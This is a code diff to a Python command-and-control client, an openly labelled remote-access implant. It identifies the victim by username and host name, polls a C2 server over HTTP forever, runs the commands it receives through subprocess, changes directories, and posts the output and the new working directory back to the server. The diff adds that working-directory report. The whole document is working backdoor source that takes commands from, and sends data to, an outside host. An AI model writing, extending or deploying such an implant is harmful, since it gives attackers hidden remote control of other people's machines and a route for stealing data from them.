@@ -1,13 +1,12 @@
 # Command and Control client Code
 
-from os import chdir, getenv
-from pyclbr import Function
+from os import chdir, getcwd, getenv
 from subprocess import run, PIPE, STDOUT
 from time import sleep, time
 from requests import exceptions, get, post
 from sys import platform
 from os import uname
-from settings import PORT, CMD_REQUEST, RESPONSE_PATH, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER
+from settings import PORT, CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER
 
 if getenv("OS") == "Windows_NT":
     client = getenv("USERNAME", "") + "@" + getenv("COMPUTERNAME", "") + "@" + str(time())
@@ -18,15 +17,15 @@ elif platform == "darwin":
 else:
     client = "unknown" + "@" + "unknown" + "@" + str(time())
 
-def post_to_server(message: str, respone_path: str = RESPONSE_PATH):
+def post_to_server(message: str, respone_path: str = RESPONSE):
     """ Function to post data to the c2 server. Accepts a message and a response path (optional) as arguments."""
     try:
         post(url=f"http://{C2_SERVER}:{PORT}{respone_path}", data={RESPONSE_KEY: message}, headers=HEADER, proxies=PROXY)
     except exceptions.RequestException:
         return
 
+# Try an HTTP GET request to the c2 server and retrive a response; if it fails, keep trying forever
 while True:
-    # Try an HTTP GET request to the c2 server and retrive a response; if it fails, keep trying forever
     try:
         response = get(url=f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
 
@@ -54,6 +53,8 @@ while True:
             post_to_server(f"Permission denied to access directory {directory}")
         except OSError:
             post_to_server(f"Error accessing directory {directory}")
+        else:
+            post_to_server(getcwd(), CWD_RESPONSE)
 
     # Else, run our operating system command and send the output to the c2
     else:
